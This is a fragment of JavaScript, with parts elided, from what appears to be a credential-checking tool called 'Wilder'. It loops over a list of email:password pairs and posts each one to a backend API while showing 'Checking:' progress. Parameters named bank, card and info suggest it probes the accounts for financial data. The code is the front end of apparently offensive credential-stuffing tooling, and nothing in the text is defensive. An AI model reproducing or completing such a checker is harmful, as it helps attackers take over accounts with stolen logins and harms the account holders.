		...
		function GbrnTmfn(lstMP, curMP, delim, cEmail, bank, card, info, no){
			...
			ajaxCall = $.ajax({
				...
				beforeSend: function (e) {
					updateTitle('['+no+'/'+lstMP.length+'] Wilder');
					$('#checkdata').html(''+no+'/'+lstMP.length+'');
					$('#checkStatus').html('Checking: '+ lstMP[curMP]).effect("highlight", {color:'#00ff00'}, 1000);
					$('#loading').attr('src', 'img/loading.gif');
				},
				data: 'ajax=1&do=api&mailpass='+encodeURIComponent(lstMP[curMP])
